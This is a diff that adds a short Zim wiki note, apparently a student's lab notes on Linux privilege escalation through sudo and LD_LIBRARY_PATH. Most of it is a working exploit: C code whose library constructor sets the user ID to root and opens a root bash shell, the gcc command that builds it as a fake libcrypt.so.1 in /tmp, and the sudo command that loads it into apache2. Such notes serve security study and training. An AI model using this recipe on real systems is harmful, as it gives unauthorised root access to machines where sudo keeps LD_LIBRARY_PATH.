@@ -1,0 +1,35 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.4
+Creation-Date: 2020-05-19T05:37:29-04:00
+
+====== library path ======
+Created Tuesday 19 May 2020
+
+Run ldd against the apache2 program file to see which shared libraries are used by the program:
+
+
+
+
+
+#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+		unsetenv("LD_LIBRARY_PATH");
+		setresuid(0,0,0);
+		system("/bin/bash -p");
+}
+
+
+save this file as library_path.c 
+
+
+Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library_path.c:
+
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+
+Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):
+
+sudo LD_LIBRARY_PATH=/tmp apache2
